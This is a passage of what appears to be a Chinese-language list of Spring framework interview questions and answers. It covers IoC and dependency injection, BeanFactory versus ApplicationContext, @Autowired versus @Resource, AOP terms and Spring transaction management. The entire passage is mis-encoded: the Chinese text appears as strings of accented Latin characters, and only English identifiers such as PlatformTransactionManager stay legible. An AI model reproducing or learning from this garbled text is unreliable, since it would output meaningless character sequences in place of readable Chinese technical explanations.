ä¸­æŠ½å–å‡ºæ¥ï¼Œäº¤ç»™å®¹å™¨æ¥å®Œæˆã€‚DIæ˜¯å¯¹IoCæ›´å‡†ç¡®çš„æè¿°ï¼Œå³ç»„ä»¶ä¹‹é—´çš„ä¾èµ–å…³ç³»ç”±å®¹å™¨åœ¨è¿è¡ŒæœŸå†³å®šï¼Œå½¢è±¡çš„æ¥è¯´ï¼Œå³ç”±å®¹å™¨åŠ¨æ€çš„å°†æŸç§ä¾èµ–å…³ç³»æ³¨å…¥åˆ°ç»„ä»¶ä¹‹ä¸­ã€‚ ä¸€ä¸ªç±»Aéœ€è¦ç”¨åˆ°æ¥å£Bä¸­çš„æ–¹æ³•ï¼Œé‚£ä¹ˆå°±éœ€è¦ä¸ºç±»Aå’Œæ¥å£Bå»ºç«‹å…³è”æˆ–ä¾èµ–å…³ç³»ï¼Œæœ€åŸå§‹çš„æ–¹æ³•æ˜¯åœ¨ç±»Aä¸­åˆ›å»ºä¸€ä¸ªæ¥å£Bçš„å®ç°ç±»Cçš„å®ä¾‹ï¼Œä½†è¿™ç§æ–¹æ³•éœ€è¦å¼€å‘äººå‘˜è‡ªè¡Œç»´æŠ¤äºŒè€…çš„ä¾èµ–å…³ç³»ï¼Œä¹Ÿå°±æ˜¯è¯´å½“ä¾èµ–å…³ç³»å‘ç”Ÿå˜åŠ¨çš„æ—¶å€™éœ€è¦ä¿®æ”¹ä»£ç å¹¶é‡æ–°æ„å»ºæ•´ä¸ªç³»ç»Ÿã€‚å¦‚æœé€šè¿‡ä¸€ä¸ªå®¹å™¨æ¥ç®¡ç†è¿™äº›å¯¹è±¡ä»¥åŠå¯¹è±¡çš„ä¾èµ–å…³ç³»ï¼Œåˆ™åªéœ€è¦åœ¨ç±»Aä¸­å®šä¹‰å¥½ç”¨äºå…³è”æ¥å£Bçš„æ–¹æ³•ï¼ˆæ„é€ å™¨æˆ–setteræ–¹æ³•ï¼‰ï¼Œå°†ç±»Aå’Œæ¥å£Bçš„å®ç°ç±»Cæ”¾å…¥å®¹å™¨ä¸­ï¼Œé€šè¿‡å¯¹å®¹å™¨çš„é…ç½®æ¥å®ç°äºŒè€…çš„å…³è”ã€‚ä¾èµ–æ³¨å…¥å¯ä»¥é€šè¿‡setteræ–¹æ³•æ³¨å…¥ï¼ˆè®¾å€¼æ³¨å…¥ï¼‰ã€æ„é€ å™¨æ³¨å…¥å’Œæ¥å£æ³¨å…¥ä¸‰ç§æ–¹å¼æ¥å®ç°ï¼ŒSpringæ”¯æŒsetteræ³¨å…¥å’Œæ„é€ å™¨æ³¨å…¥ï¼Œé€šå¸¸ä½¿ç”¨æ„é€ å™¨æ³¨å…¥æ¥æ³¨å…¥å¿…é¡»çš„ä¾èµ–å…³ç³»ï¼Œå¯¹äºå¯é€‰çš„ä¾èµ–å…³ç³»ï¼Œåˆ™setteræ³¨å…¥æ˜¯æ›´å¥½çš„é€‰æ‹©ï¼Œsetteræ³¨å…¥éœ€è¦ç±»æä¾›æ— å‚æ„é€ å™¨æˆ–è€…æ— å‚çš„é™æ€å·¥å‚æ–¹æ³•æ¥åˆ›å»ºå¯¹è±¡ã€‚ Springä¸­BeanFactoryå’ŒApplicationContextçš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼ŸBeanFactoryBeanFactoryæ˜¯springä¸­æ¯”è¾ƒåŸå§‹ï¼Œæ¯”è¾ƒå¤è€çš„Factoryã€‚å› ä¸ºæ¯”è¾ƒå¤è€ï¼Œæ‰€ä»¥BeanFactoryæ— æ³•æ”¯æŒspringæ’ä»¶ï¼Œä¾‹å¦‚ï¼šAOPã€Webåº”ç”¨ç­‰åŠŸèƒ½ã€‚ ApplicationContextApplicationContextæ˜¯BeanFactoryçš„å­ç±»ï¼Œå› ä¸ºå¤è€çš„BeanFactoryæ— æ³•æ»¡è¶³ä¸æ–­æ›´æ–°çš„springçš„éœ€æ±‚ï¼Œäºæ˜¯ApplicationContextå°±åŸºæœ¬ä¸Šä»£æ›¿äº†BeanFactoryçš„å·¥ä½œï¼Œä»¥ä¸€ç§æ›´é¢å‘æ¡†æ¶çš„å·¥ä½œæ–¹å¼ä»¥åŠå¯¹ä¸Šä¸‹æ–‡è¿›è¡Œåˆ†å±‚å’Œå®ç°ç»§æ‰¿ï¼Œå¹¶åœ¨è¿™ä¸ªåŸºç¡€ä¸Šå¯¹åŠŸèƒ½è¿›è¡Œæ‰©å±•ï¼š MessageSource, æä¾›å›½é™…åŒ–çš„æ¶ˆæ¯è®¿é—® èµ„æºè®¿é—®ï¼ˆå¦‚URLå’Œæ–‡ä»¶ï¼‰ äº‹ä»¶ä¼ é€’ Beançš„è‡ªåŠ¨è£…é… å„ç§ä¸åŒåº”ç”¨å±‚çš„Contextå®ç° åŒºåˆ«ï¼š å¦‚æœä½¿ç”¨ApplicationContextï¼Œå¦‚æœé…ç½®çš„beanæ˜¯singletonï¼Œé‚£ä¹ˆä¸ç®¡ä½ æœ‰æ²¡æœ‰æˆ–æƒ³ä¸æƒ³ç”¨å®ƒï¼Œå®ƒéƒ½ä¼šè¢«å®ä¾‹åŒ–ã€‚å¥½å¤„æ˜¯å¯ä»¥é¢„å…ˆåŠ è½½ï¼Œåå¤„æ˜¯æµªè´¹å†…å­˜ã€‚ BeanFactoryï¼Œå½“ä½¿ç”¨BeanFactoryå®ä¾‹åŒ–å¯¹è±¡æ—¶ï¼Œé…ç½®çš„beanä¸ä¼šé©¬ä¸Šè¢«å®ä¾‹åŒ–ï¼Œè€Œæ˜¯ç­‰åˆ°ä½ ä½¿ç”¨è¯¥beançš„æ—¶å€™ï¼ˆgetBeanï¼‰æ‰ä¼šè¢«å®ä¾‹åŒ–ã€‚å¥½å¤„æ˜¯èŠ‚çº¦å†…å­˜ï¼Œåå¤„æ˜¯é€Ÿåº¦æ¯”è¾ƒæ…¢ã€‚å¤šç”¨äºç§»åŠ¨è®¾å¤‡çš„å¼€å‘ã€‚ æ²¡æœ‰ç‰¹æ®Šè¦æ±‚çš„æƒ…å†µä¸‹ï¼Œåº”è¯¥ä½¿ç”¨ApplicationContextå®Œæˆã€‚å› ä¸ºBeanFactoryèƒ½å®Œæˆçš„äº‹æƒ…ï¼ŒApplicationContextéƒ½èƒ½å®Œæˆï¼Œå¹¶ä¸”æä¾›äº†æ›´å¤šæ¥è¿‘ç°åœ¨å¼€å‘çš„åŠŸèƒ½ã€‚ è¯´æ˜ä¸€ä¸‹springIOCåŸç†æ˜¯ä»€ä¹ˆï¼Ÿå¦‚æœä½ è¦å®ç°IOCéœ€è¦æ€ä¹ˆåšï¼Ÿè¯·ç®€å•æè¿°ä¸€ä¸‹å®ç°æ­¥éª¤ï¼Ÿâ‘ IoCï¼ˆInversion of Controlï¼Œæ§åˆ¶å€’è½¬ï¼‰ã€‚è¿™æ˜¯springçš„æ ¸å¿ƒï¼Œè´¯ç©¿å§‹ç»ˆã€‚æ‰€è°“IoCï¼Œå¯¹äºspringæ¡†æ¶æ¥è¯´ï¼Œå°±æ˜¯ç”±springæ¥è´Ÿè´£æ§åˆ¶å¯¹è±¡çš„ç”Ÿå‘½å‘¨æœŸå’Œå¯¹è±¡é—´çš„å…³ç³»ã€‚ IoCçš„ä¸€ä¸ªé‡ç‚¹æ˜¯åœ¨ç³»ç»Ÿè¿è¡Œä¸­ï¼ŒåŠ¨æ€çš„å‘æŸä¸ªå¯¹è±¡æä¾›å®ƒæ‰€éœ€è¦çš„å…¶ä»–å¯¹è±¡ã€‚è¿™ä¸€ç‚¹æ˜¯é€šè¿‡DIï¼ˆDependency Injectionï¼Œä¾èµ–æ³¨å…¥ï¼‰æ¥å®ç°çš„ã€‚æ¯”å¦‚å¯¹è±¡Aéœ€è¦æ“ä½œæ•°æ®åº“ï¼Œä»¥å‰æˆ‘ä»¬æ€»æ˜¯è¦åœ¨Aä¸­è‡ªå·±ç¼–å†™ä»£ç æ¥è·å¾—ä¸€ä¸ªConnectionå¯¹è±¡ï¼Œæœ‰äº† springæˆ‘ä»¬å°±åªéœ€è¦å‘Šè¯‰springï¼ŒAä¸­éœ€è¦ä¸€ä¸ªConnectionï¼Œè‡³äºè¿™ä¸ªConnectionæ€ä¹ˆæ„é€ ï¼Œä½•æ—¶æ„é€ ï¼ŒAä¸éœ€è¦çŸ¥é“ã€‚åœ¨ç³»ç»Ÿè¿è¡Œæ—¶ï¼Œspringä¼šåœ¨é€‚å½“çš„æ—¶å€™åˆ¶é€ ä¸€ä¸ªConnectionï¼Œç„¶ååƒæ‰“é’ˆä¸€æ ·ï¼Œæ³¨å°„åˆ°Aå½“ä¸­ï¼Œè¿™æ ·å°±å®Œæˆäº†å¯¹å„ä¸ªå¯¹è±¡ä¹‹é—´å…³ç³»çš„æ§åˆ¶ã€‚Aéœ€è¦ä¾èµ– Connectionæ‰èƒ½æ­£å¸¸è¿è¡Œï¼Œè€Œè¿™ä¸ªConnectionæ˜¯ç”±springæ³¨å…¥åˆ°Aä¸­çš„ï¼Œä¾èµ–æ³¨å…¥çš„åå­—å°±è¿™ä¹ˆæ¥çš„ã€‚é‚£ä¹ˆDIæ˜¯å¦‚ä½•å®ç°çš„å‘¢ï¼Ÿ Java 1.3ä¹‹åä¸€ä¸ªé‡è¦ç‰¹å¾æ˜¯åå°„ï¼ˆreflectionï¼‰ï¼Œå®ƒå…è®¸ç¨‹åºåœ¨è¿è¡Œçš„æ—¶å€™åŠ¨æ€çš„ç”Ÿæˆå¯¹è±¡ã€æ‰§è¡Œå¯¹è±¡çš„æ–¹æ³•ã€æ”¹å˜å¯¹è±¡çš„å±æ€§ï¼Œspringå°±æ˜¯é€šè¿‡åå°„æ¥å®ç°æ³¨å…¥çš„ã€‚ ä¸¾ä¸ªç®€å•çš„ä¾‹å­ï¼Œæˆ‘ä»¬æ‰¾å¥³æœ‹å‹å¸¸è§çš„æƒ…å†µæ˜¯ï¼Œæˆ‘ä»¬åˆ°å¤„å»çœ‹å“ªé‡Œæœ‰é•¿å¾—æ¼‚äº®èº«æåˆå¥½çš„å¥³å­©å­ï¼Œç„¶åæ‰“å¬å¥¹ä»¬çš„å…´è¶£çˆ±å¥½ã€qqå·ã€ç”µè¯å·ã€ipå·ã€iqå·â€¦â€¦â€¦ï¼Œæƒ³åŠæ³•è®¤è¯†å¥¹ä»¬ï¼ŒæŠ•å…¶æ‰€å¥½é€å…¶æ‰€è¦ï¼Œè¿™ä¸ªè¿‡ç¨‹æ˜¯å¤æ‚æ·±å¥¥çš„ï¼Œæˆ‘ä»¬å¿…é¡»è‡ªå·±è®¾è®¡å’Œé¢å¯¹æ¯ä¸ªç¯èŠ‚ã€‚ä¼ ç»Ÿçš„ç¨‹åºå¼€å‘ä¹Ÿæ˜¯å¦‚æ­¤ï¼Œåœ¨ä¸€ä¸ªå¯¹è±¡ä¸­ï¼Œå¦‚æœè¦ä½¿ç”¨å¦å¤–çš„å¯¹è±¡ï¼Œå°±å¿…é¡»å¾—åˆ°å®ƒï¼ˆè‡ªå·±newä¸€ä¸ªï¼Œæˆ–è€…ä»JNDIä¸­æŸ¥è¯¢ä¸€ä¸ªï¼‰ï¼Œä½¿ç”¨å®Œä¹‹åè¿˜è¦å°†å¯¹è±¡é”€æ¯ï¼ˆæ¯”å¦‚Connectionç­‰ï¼‰ï¼Œå¯¹è±¡å§‹ç»ˆä¼šå’Œå…¶ä»–çš„æ¥å£æˆ–ç±»è—•åˆèµ·æ¥ã€‚ â‘¡å®ç°IOCçš„æ­¥éª¤ å®šä¹‰ç”¨æ¥æè¿°beançš„é…ç½®çš„Javaç±» è§£æbeançš„é…ç½®ï¼Œå°‡beançš„é…ç½®ä¿¡æ¯è½¬æ¢ä¸ºä¸Šé¢çš„BeanDefinitionå¯¹è±¡ä¿å­˜åœ¨å†…å­˜ä¸­ï¼Œspringä¸­é‡‡ç”¨HashMapè¿›è¡Œå¯¹è±¡å­˜å‚¨ï¼Œå…¶ä¸­ä¼šç”¨åˆ°ä¸€äº›xmlè§£ææŠ€æœ¯ éå†å­˜æ”¾BeanDefinitionçš„HashMapå¯¹è±¡ï¼Œé€æ¡å–å‡ºBeanDefinitionå¯¹è±¡ï¼Œè·å–beançš„é…ç½®ä¿¡æ¯ï¼Œåˆ©ç”¨Javaçš„åå°„æœºåˆ¶å®ä¾‹åŒ–å¯¹è±¡ï¼Œå°‡å®ä¾‹åŒ–åçš„å¯¹è±¡ä¿å­˜åœ¨å¦å¤–ä¸€ä¸ªMapä¸­å³å¯ã€‚ ç®€å•è¯´æ˜ä¸€ä¸‹ä¾èµ–æ³¨å…¥çš„æ–¹å¼æœ‰å“ªå‡ ç§ï¼Ÿä»¥åŠè¿™äº›æ–¹æ³•å¦‚ä½•ä½¿ç”¨ï¼Ÿ 1ã€Setæ³¨å…¥ 2ã€æ„é€ å™¨æ³¨å…¥ 3ã€æ¥å£æ³¨å…¥ @Controllerå’Œ@RestControllerçš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ @RestControlleræ³¨è§£ç›¸å½“äº@ResponseBody ï¼‹ @Controlleråˆåœ¨ä¸€èµ·çš„ä½œç”¨ è°ˆä¸€ä¸‹autowired å’ŒresourceåŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ1ã€å…±åŒç‚¹ ä¸¤è€…éƒ½å¯ä»¥å†™åœ¨å­—æ®µå’Œsetteræ–¹æ³•ä¸Šã€‚ä¸¤è€…å¦‚æœéƒ½å†™åœ¨å­—æ®µä¸Šï¼Œé‚£ä¹ˆå°±ä¸éœ€è¦å†å†™setteræ–¹æ³•ã€‚ 2ã€ä¸åŒç‚¹ ï¼ˆ1ï¼‰@Autowired @Autowiredä¸ºSpringæä¾›çš„æ³¨è§£ï¼Œéœ€è¦å¯¼å…¥åŒ…org.springframework.beans.factory.annotation.Autowired;åªæŒ‰ç…§byTypeæ³¨å…¥ã€‚ @Autowiredæ³¨è§£æ˜¯æŒ‰ç…§ç±»å‹ï¼ˆbyTypeï¼‰è£…é…ä¾èµ–å¯¹è±¡ï¼Œé»˜è®¤æƒ…å†µä¸‹å®ƒè¦æ±‚ä¾èµ–å¯¹è±¡å¿…é¡»å­˜åœ¨ï¼Œå¦‚æœå…è®¸nullå€¼ï¼Œå¯ä»¥è®¾ç½®å®ƒçš„requiredå±æ€§ä¸ºfalseã€‚å¦‚æœæˆ‘ä»¬æƒ³ä½¿ç”¨æŒ‰ç…§åç§°ï¼ˆbyNameï¼‰æ¥è£…é…ï¼Œå¯ä»¥ç»“åˆ@Qualifieræ³¨è§£ä¸€èµ·ä½¿ç”¨ã€‚ ï¼ˆ2ï¼‰@Resource @Resourceé»˜è®¤æŒ‰ç…§ByNameè‡ªåŠ¨æ³¨å…¥ï¼Œç”±J2EEæä¾›ï¼Œéœ€è¦å¯¼å…¥åŒ…javax.annotation.Resourceã€‚@Resourceæœ‰ä¸¤ä¸ªé‡è¦çš„å±æ€§ï¼šnameå’Œtypeï¼Œè€ŒSpringå°†@Resourceæ³¨è§£çš„nameå±æ€§è§£æä¸ºbeançš„åå­—ï¼Œè€Œtypeå±æ€§åˆ™è§£æä¸ºbeançš„ç±»å‹ã€‚æ‰€ä»¥ï¼Œå¦‚æœä½¿ç”¨nameå±æ€§ï¼Œåˆ™ä½¿ç”¨byNameçš„è‡ªåŠ¨æ³¨å…¥ç­–ç•¥ï¼Œè€Œä½¿ç”¨typeå±æ€§æ—¶åˆ™ä½¿ç”¨byTypeè‡ªåŠ¨æ³¨å…¥ç­–ç•¥ã€‚å¦‚æœæ—¢ä¸åˆ¶å®šnameä¹Ÿä¸åˆ¶å®štypeå±æ€§ï¼Œè¿™æ—¶å°†é€šè¿‡åå°„æœºåˆ¶ä½¿ç”¨byNameè‡ªåŠ¨æ³¨å…¥ç­–ç•¥ã€‚ ä»‹ç»ä¸€ä¸‹beançš„ç”Ÿå‘½å‘¨æœŸSpringç”Ÿå‘½å‘¨æœŸæµç¨‹å›¾ï¼š ç®€è¦è¯´æ˜ä¸€ä¸‹IOCå’ŒAOPæ˜¯ä»€ä¹ˆï¼Ÿä¾èµ–æ³¨å…¥çš„ä¸‰ç§æ–¹å¼ï¼š ï¼ˆ1ï¼‰æ¥å£æ³¨å…¥ ï¼ˆ2ï¼‰Constructæ³¨å…¥ ï¼ˆ3ï¼‰Setteræ³¨å…¥ æ§åˆ¶åè½¬ï¼ˆIoCï¼‰ä¸ä¾èµ–æ³¨å…¥ï¼ˆDIï¼‰æ˜¯åŒä¸€ä¸ªæ¦‚å¿µï¼Œå¼•å…¥IOCçš„ç›®çš„ï¼š ï¼ˆ1ï¼‰è„±å¼€ã€é™ä½ç±»ä¹‹é—´çš„è€¦åˆï¼› ï¼ˆ2ï¼‰å€¡å¯¼é¢å‘æ¥å£ç¼–ç¨‹ã€å®æ–½ä¾èµ–å€’æ¢åŸåˆ™ï¼› ï¼ˆ3ï¼‰æé«˜ç³»ç»Ÿå¯æ’å…¥ã€å¯æµ‹è¯•ã€å¯ä¿®æ”¹ç­‰ç‰¹æ€§ã€‚ å…·ä½“åšæ³•ï¼š ï¼ˆ1ï¼‰å°†beanä¹‹é—´çš„ä¾èµ–å…³ç³»å°½å¯èƒ½åœ°æŠ“æ¢ä¸ºå…³è”å…³ç³»ï¼› ï¼ˆ2ï¼‰å°†å¯¹å…·ä½“ç±»çš„å…³è”å°½å¯èƒ½åœ°è½¬æ¢ä¸ºå¯¹Java interfaceçš„å…³è”ï¼Œè€Œä¸æ˜¯ä¸å…·ä½“çš„æœåŠ¡å¯¹è±¡ç›¸å…³è”ï¼› ï¼ˆ3ï¼‰Beanå®ä¾‹å…·ä½“å…³è”ç›¸å…³Java interfaceçš„å“ªä¸ªå®ç°ç±»çš„å®ä¾‹ï¼Œåœ¨é…ç½®ä¿¡æ¯çš„å…ƒæ•°æ®ä¸­æè¿°ï¼› ï¼ˆ4ï¼‰ç”±IoCç»„ä»¶ï¼ˆæˆ–ç§°å®¹å™¨ï¼‰æ ¹æ®é…ç½®ä¿¡æ¯ï¼Œå®ä¾‹åŒ–å…·ä½“beanç±»ã€å°†beanä¹‹é—´çš„ä¾èµ–å…³ç³»æ³¨å…¥è¿›æ¥ã€‚ AOPï¼ˆAspect Oriented Programmingï¼‰ï¼Œå³é¢å‘åˆ‡é¢ç¼–ç¨‹ï¼Œå¯ä»¥è¯´æ˜¯OOPï¼ˆObject Oriented Programmingï¼Œé¢å‘å¯¹è±¡ç¼–ç¨‹ï¼‰çš„è¡¥å……å’Œå®Œå–„ã€‚OOPå¼•å…¥å°è£…ã€ç»§æ‰¿ã€å¤šæ€ç­‰æ¦‚å¿µæ¥å»ºç«‹ä¸€ç§å¯¹è±¡å±‚æ¬¡ç»“æ„ï¼Œç”¨äºæ¨¡æ‹Ÿå…¬å…±è¡Œä¸ºçš„ä¸€ä¸ªé›†åˆã€‚ä¸è¿‡OOPå…è®¸å¼€å‘è€…å®šä¹‰çºµå‘çš„å…³ç³»ï¼Œä½†å¹¶ä¸é€‚åˆå®šä¹‰æ¨ªå‘çš„å…³ç³»ï¼Œä¾‹å¦‚æ—¥å¿—åŠŸèƒ½ã€‚æ—¥å¿—ä»£ç å¾€å¾€æ¨ªå‘åœ°æ•£å¸ƒåœ¨æ‰€æœ‰å¯¹è±¡å±‚æ¬¡ä¸­ï¼Œè€Œä¸å®ƒå¯¹åº”çš„å¯¹è±¡çš„æ ¸å¿ƒåŠŸèƒ½æ¯«æ— å…³ç³»å¯¹äºå…¶ä»–ç±»å‹çš„ä»£ç ï¼Œå¦‚å®‰å…¨æ€§ã€å¼‚å¸¸å¤„ç†å’Œé€æ˜çš„æŒç»­æ€§ä¹Ÿéƒ½æ˜¯å¦‚æ­¤ï¼Œè¿™ç§æ•£å¸ƒåœ¨å„å¤„çš„æ— å…³çš„ä»£ç è¢«ç§°ä¸ºæ¨ªåˆ‡ï¼ˆcross cuttingï¼‰ï¼Œåœ¨OOPè®¾è®¡ä¸­ï¼Œå®ƒå¯¼è‡´äº†å¤§é‡ä»£ç çš„é‡å¤ï¼Œè€Œä¸åˆ©äºå„ä¸ªæ¨¡å—çš„é‡ç”¨ã€‚ AOPæŠ€æœ¯æ°æ°ç›¸åï¼Œå®ƒåˆ©ç”¨ä¸€ç§ç§°ä¸ºâ€æ¨ªåˆ‡â€çš„æŠ€æœ¯ï¼Œå‰–è§£å¼€å°è£…çš„å¯¹è±¡å†…éƒ¨ï¼Œå¹¶å°†é‚£äº›å½±å“äº†å¤šä¸ªç±»çš„å…¬å…±è¡Œä¸ºå°è£…åˆ°ä¸€ä¸ªå¯é‡ç”¨æ¨¡å—ï¼Œå¹¶å°†å…¶å‘½åä¸ºâ€Aspectâ€ï¼Œå³åˆ‡é¢ã€‚æ‰€è°“â€åˆ‡é¢â€ï¼Œç®€å•è¯´å°±æ˜¯é‚£äº›ä¸ä¸šåŠ¡æ— å…³ï¼Œå´ä¸ºä¸šåŠ¡æ¨¡å—æ‰€å…±åŒè°ƒç”¨çš„é€»è¾‘æˆ–è´£ä»»å°è£…èµ·æ¥ï¼Œä¾¿äºå‡å°‘ç³»ç»Ÿçš„é‡å¤ä»£ç ï¼Œé™ä½æ¨¡å—ä¹‹é—´çš„è€¦åˆåº¦ï¼Œå¹¶æœ‰åˆ©äºæœªæ¥çš„å¯æ“ä½œæ€§å’Œå¯ç»´æŠ¤æ€§ã€‚ ä½¿ç”¨â€æ¨ªåˆ‡â€æŠ€æœ¯ï¼ŒAOPæŠŠè½¯ä»¶ç³»ç»Ÿåˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†ï¼šæ ¸å¿ƒå…³æ³¨ç‚¹å’Œæ¨ªåˆ‡å…³æ³¨ç‚¹ã€‚ä¸šåŠ¡å¤„ç†çš„ä¸»è¦æµç¨‹æ˜¯æ ¸å¿ƒå…³æ³¨ç‚¹ï¼Œä¸ä¹‹å…³ç³»ä¸å¤§çš„éƒ¨åˆ†æ˜¯æ¨ªåˆ‡å…³æ³¨ç‚¹ã€‚æ¨ªåˆ‡å…³æ³¨ç‚¹çš„ä¸€ä¸ªç‰¹ç‚¹æ˜¯ï¼Œä»–ä»¬ç»å¸¸å‘ç”Ÿåœ¨æ ¸å¿ƒå…³æ³¨ç‚¹çš„å¤šå¤„ï¼Œè€Œå„å¤„åŸºæœ¬ç›¸ä¼¼ï¼Œæ¯”å¦‚æƒé™è®¤è¯ã€æ—¥å¿—ã€äº‹ç‰©ã€‚AOPçš„ä½œç”¨åœ¨äºåˆ†ç¦»ç³»ç»Ÿä¸­çš„å„ç§å…³æ³¨ç‚¹ï¼Œå°†æ ¸å¿ƒå…³æ³¨ç‚¹å’Œæ¨ªåˆ‡å…³æ³¨ç‚¹åˆ†ç¦»å¼€æ¥ã€‚ Springæ”¯æŒçš„äº‹åŠ¡ç®¡ç†ç±»å‹æœ‰å“ªäº›ï¼Ÿä»¥åŠä½ åœ¨é¡¹ç›®ä¸­ä¼šä½¿ç”¨å“ªç§æ–¹å¼ï¼ŸSpringæ”¯æŒç¼–ç¨‹å¼äº‹åŠ¡ç®¡ç†å’Œå£°æ˜å¼äº‹åŠ¡ç®¡ç†ã€‚è®¸å¤šSpringæ¡†æ¶çš„ç”¨æˆ·é€‰æ‹©å£°æ˜å¼äº‹åŠ¡ç®¡ç†ï¼Œå› ä¸ºè¿™ç§æ–¹å¼å’Œåº”ç”¨ç¨‹åºçš„å…³è”è¾ƒå°‘ï¼Œå› æ­¤æ›´åŠ ç¬¦åˆè½»é‡çº§å®¹å™¨çš„æ¦‚å¿µã€‚å£°æ˜å¼äº‹åŠ¡ç®¡ç†è¦ä¼˜äºç¼–ç¨‹å¼äº‹åŠ¡ç®¡ç†ï¼Œå°½ç®¡åœ¨çµæ´»æ€§æ–¹é¢å®ƒå¼±äºç¼–ç¨‹å¼äº‹åŠ¡ç®¡ç†ï¼Œå› ä¸ºç¼–ç¨‹å¼äº‹åŠ¡å…è®¸ä½ é€šè¿‡ä»£ç æ§åˆ¶ä¸šåŠ¡ã€‚ äº‹åŠ¡åˆ†ä¸ºå…¨å±€äº‹åŠ¡å’Œå±€éƒ¨äº‹åŠ¡ã€‚å…¨å±€äº‹åŠ¡ç”±åº”ç”¨æœåŠ¡å™¨ç®¡ç†ï¼Œéœ€è¦åº•å±‚æœåŠ¡å™¨JTAæ”¯æŒï¼ˆå¦‚WebLogicã€WildFlyç­‰ï¼‰ã€‚å±€éƒ¨äº‹åŠ¡å’Œåº•å±‚é‡‡ç”¨çš„æŒä¹…åŒ–æ–¹æ¡ˆæœ‰å…³ï¼Œä¾‹å¦‚ä½¿ç”¨JDBCè¿›è¡ŒæŒä¹…åŒ–æ—¶ï¼Œéœ€è¦ä½¿ç”¨Connetionå¯¹è±¡æ¥æ“ä½œäº‹åŠ¡ï¼›è€Œé‡‡ç”¨Hibernateè¿›è¡ŒæŒä¹…åŒ–æ—¶ï¼Œéœ€è¦ä½¿ç”¨Sessionå¯¹è±¡æ¥æ“ä½œäº‹åŠ¡ã€‚ è¿™äº›äº‹åŠ¡çš„çˆ¶æ¥å£éƒ½æ˜¯PlatformTransactionManagerã€‚Springçš„äº‹åŠ¡ç®¡ç†æœºåˆ¶æ˜¯ä¸€ç§å…¸å‹çš„ç­–ç•¥æ¨¡å¼ï¼ŒPlatformTransactionManagerä»£è¡¨äº‹åŠ¡ç®¡ç†æ¥å£ï¼Œè¯¥æ¥å£å®šä¹‰äº†ä¸‰ä¸ªæ–¹æ³•ï¼Œè¯¥æ¥å£å¹¶ä¸çŸ¥é“åº•å±‚å¦‚ä½•ç®¡ç†äº‹åŠ¡ï¼Œä½†æ˜¯å®ƒçš„å®ç°ç±»å¿…é¡»æä¾›getTransaction()æ–¹æ³•ï¼ˆå¼€å¯äº‹åŠ¡ï¼‰ã€commit()æ–¹æ³•ï¼ˆæäº¤äº‹åŠ¡ï¼‰ã€rollback()æ–¹æ³•ï¼ˆå›æ»šäº‹åŠ¡ï¼‰çš„å¤šæ€å®ç°ï¼Œè¿™æ ·å°±å¯ä»¥ç”¨ä¸åŒçš„å®ç°ç±»ä»£è¡¨ä¸åŒçš„äº‹åŠ¡ç®¡ç†ç­–ç•¥ã€‚ä½¿ç”¨JTAå…¨å±€äº‹åŠ¡ç­–ç•¥æ—¶ï¼Œéœ€è¦åº•å±‚åº”ç”¨æœåŠ¡å™¨æ”¯æŒï¼Œè€Œä¸åŒçš„åº”ç”¨æœåŠ¡å™¨æ‰€æä¾›çš„JTAå…¨å±€äº‹åŠ¡å¯èƒ½å­˜åœ¨ç»†èŠ‚ä¸Šçš„å·®å¼‚ï¼Œå› æ­¤å®é™…é…ç½®å…¨å±€äº‹åŠ¡ç®¡ç†å™¨æ˜¯å¯èƒ½éœ€è¦ä½¿ç”¨JtaTransactionManagerçš„å­ç±»ï¼Œå¦‚ï¼šWebLogicJtaTransactionManagerï¼ˆOracleçš„WebLogicæœåŠ¡å™¨æä¾›ï¼‰ã€UowJtaTransactionManagerï¼ˆIBMçš„WebSphereæœåŠ¡å™¨æä¾›ï¼‰ç­‰ã€‚ å¦‚ä½•ç†è§£AOPä¸­çš„è¿æ¥ç‚¹ï¼ˆJoinpointï¼‰ã€åˆ‡ç‚¹ï¼ˆPointcutï¼‰ã€å¢å¼ºï¼ˆAdviceï¼‰ã€å¼•ä»‹ï¼ˆIntroductionï¼‰ã€ç»‡å…¥ï¼ˆWeavingï¼‰ã€åˆ‡é¢ï¼ˆAspectï¼‰è¿™äº›æ¦‚å¿µï¼Ÿa. è¿æ¥ç‚¹ï¼ˆJoinpointï¼‰ï¼šç¨‹åºæ‰§è¡Œçš„æŸä¸ªç‰¹å®šä½ç½®ï¼ˆå¦‚ï¼šæŸä¸ªæ–¹æ³•è°ƒç”¨å‰ã€è°ƒç”¨åï¼Œæ–¹æ³•æŠ›å‡ºå¼‚å¸¸åï¼‰ã€‚ä¸€ä¸ªç±»æˆ–ä¸€æ®µç¨‹åºä»£ç æ‹¥æœ‰ä¸€äº›å…·æœ‰è¾¹ç•Œæ€§è´¨çš„ç‰¹å®šç‚¹ï¼Œè¿™äº›ä»£ç ä¸­çš„ç‰¹å®šç‚¹å°±æ˜¯è¿æ¥ç‚¹ã€‚Springä»…æ”¯æŒæ–¹æ³•çš„è¿æ¥ç‚¹ã€‚b. åˆ‡ç‚¹ï¼ˆPointcutï¼‰ï¼šå¦‚æœè¿æ¥ç‚¹ç›¸å½“äºæ•°æ®ä¸­çš„è®°å½•ï¼Œé‚£ä¹ˆåˆ‡ç‚¹ç›¸å½“äºæŸ¥è¯¢æ¡ä»¶ï¼Œä¸€ä¸ªåˆ‡ç‚¹å¯ä»¥åŒ¹é…å¤šä¸ªè¿æ¥ç‚¹ã€‚Spring AOPçš„è§„åˆ™è§£æå¼•æ“è´Ÿè´£è§£æåˆ‡ç‚¹æ‰€è®¾å®šçš„æŸ¥è¯¢æ¡ä»¶ï¼Œæ‰¾åˆ°å¯¹åº”çš„è¿æ¥ç‚¹ã€‚c. å¢å¼ºï¼ˆAdviceï¼‰ï¼šå¢å¼ºæ˜¯ç»‡å…¥åˆ°ç›®æ ‡ç±»è¿æ¥ç‚¹ä¸Šçš„ä¸€æ®µç¨‹åºä»£ç ã€‚Springæä¾›çš„å¢å¼ºæ¥å£éƒ½æ˜¯å¸¦æ–¹ä½åçš„ï¼Œå¦‚ï¼šBeforeAdviceã€AfterReturningAdviceã€ThrowsAdviceç­‰ã€‚ d. å¼•ä»‹ï¼ˆIntroductionï¼‰ï¼šå¼•ä»‹æ˜¯ä¸€ç§ç‰¹æ®Šçš„å¢å¼ºï¼Œå®ƒä¸ºç±»æ·»åŠ ä¸€äº›å±æ€§å’Œæ–¹æ³•ã€‚è¿™æ 